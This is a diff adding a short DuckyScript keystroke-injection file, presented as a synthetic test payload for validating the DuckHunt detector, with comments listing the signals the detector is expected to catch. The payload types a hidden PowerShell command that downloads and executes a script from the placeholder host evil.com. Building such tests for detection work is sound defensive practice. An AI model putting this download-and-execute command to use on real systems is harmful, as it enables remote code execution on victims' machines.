@@ -1,0 +1,19 @@
+REM DuckHunt Test Payload: PowerShell Download-Execute Attack
+REM This is a SYNTHETIC test payload for DuckHunt detection validation
+REM Simulates a common PowerShell-based attack pattern
+
+REM Test 2: PowerShell download and execute
+DELAY 100
+GUI r
+DELAY 50
+STRING powershell -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
+ENTER
+
+REM Expected Detection:
+REM - Speed anomaly (fast consistent typing)
+REM - Pattern match: WIN+R, "powershell", "-WindowStyle Hidden", "IEX", "DownloadString"
+REM - High-risk command sequence
+REM - Run dialog context (high risk)
+REM - Zero error rate
+
+REM Detection Confidence: Expected >0.95 (multiple high-risk signals)
